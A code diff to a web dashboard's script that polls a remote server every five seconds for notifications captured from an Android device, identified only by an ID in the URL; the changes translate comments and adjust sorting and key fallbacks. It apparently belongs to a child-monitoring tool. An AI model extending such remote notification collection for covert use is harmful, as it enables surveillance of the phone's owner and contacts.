@@ -119,14 +119,13 @@
     <script>
         const RENDER_URL = "https://child-v9no.onrender.com";
         
-        // --- 1. ID NIKALNA ---
+        // --- 1. ID Fetching Logic ---
         const urlParams = new URLSearchParams(window.location.search);
         let DEVICE_ID = urlParams.get('id'); 
         if(!DEVICE_ID) { DEVICE_ID = "UNKNOWN"; } 
 
         document.addEventListener("DOMContentLoaded", () => {
             fetchNotifications();
-            // Har 5 second mein refresh
             setInterval(fetchNotifications, 5000); 
         });
 
@@ -134,7 +133,7 @@
             const listContainer = document.getElementById("notif-list");
             
             try {
-                // --- 2. DATA SERVER SE LAANA ---
+                // --- 2. Requesting Data ---
                 const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${new Date().getTime()}`);
                 
                 if (!response.ok) throw new Error("File not found");
@@ -147,18 +146,17 @@
 
                 listContainer.innerHTML = ""; 
                 
-                // --- 3. DATA DIKHANA (FIXED LOGIC) ---
-                [...data].reverse().forEach(notif => {
+                // --- 3. Sorting Fix: Removed .reverse() ---
+                // Server naya data pehle hi top par bhejta hai, isliye reverse hataya
+                data.forEach(notif => {
                     
-                    // 🔥 IMPORTANT FIX: Yahan hum Android wali keys use kar rahe hain ('app', 'time')
-                    
-                    // App Name Fix
-                    const pkgName = notif.app || notif.packageName || "system";
+                    // Matching Keys with Android App
+                    const pkgName = notif.packageName || notif.app || "system";
                     const appInfo = getAppStyle(pkgName);
                     
-                    // Time Fix
+                    // Time Formatting
                     let timeStr = "Just now";
-                    const timestamp = notif.time || notif.postTime;
+                    const timestamp = notif.postTime || notif.time;
                     if(timestamp) {
                         timeStr = new Date(parseInt(timestamp)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                     }
@@ -188,7 +186,7 @@
             }
         }
 
-        // --- 4. ICONS KA JADU ---
+        // --- 4. Icons Logic ---
         function getAppStyle(pkg) {
             if(!pkg) return { icon: 'fa-solid fa-bell', color: '#ffffff', name: 'System' };
             const p = pkg.toLowerCase();
